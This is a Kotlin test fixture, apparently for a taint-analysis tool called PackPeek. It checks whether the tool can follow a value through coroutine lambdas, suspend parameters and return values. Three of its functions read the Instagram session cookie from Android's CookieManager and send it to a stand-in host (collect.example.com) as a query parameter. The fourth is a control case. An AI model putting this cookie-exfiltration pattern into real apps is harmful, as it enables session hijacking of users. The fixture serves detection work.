// TEST SAMPLE ONLY — never runs (manifest hasCode="false"). Fake endpoints marked SIMULATION.
// Exists so PackPeek can follow values through Kotlin coroutines. It sends nothing.
package sim.app.coroutine

import android.webkit.CookieManager
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class Main(private val scope: CoroutineScope) {
    private fun cookie(): String? = CookieManager.getInstance().getCookie("https://www.instagram.com")

    private fun post(data: String?) {
        (URL("https://collect.example.com/SIMULATION?d=$data").openConnection() as HttpURLConnection).responseCode
    }

    /** 1. The cookie is captured by a launched lambda and sent from its invokeSuspend. */
    fun captured() {
        val c = cookie()
        scope.launch(Dispatchers.IO) { post(c) }
    }

    /** 2. A suspend function keeps its parameter across a suspension (continuation field L$0). */
    suspend fun upload(data: String?) {
        delay(10)
        post(data)
    }

    fun spilled() {
        val c = cookie()
        scope.launch { upload(c) }
    }

    /** 3. A suspend function returns the cookie after suspending; the caller sends the result. */
    suspend fun readLater(): String? {
        delay(10)
        return cookie()
    }

    fun returned() {
        scope.launch {
            val c = readLater()
            post(c)
        }
    }

    /** 4. Control: reads the cookie only to decide, sends a fixed text. Not a traced value. */
    fun unrelated() {
        val loggedIn = cookie() != null
        scope.launch { if (loggedIn) post("ping") }
    }
}
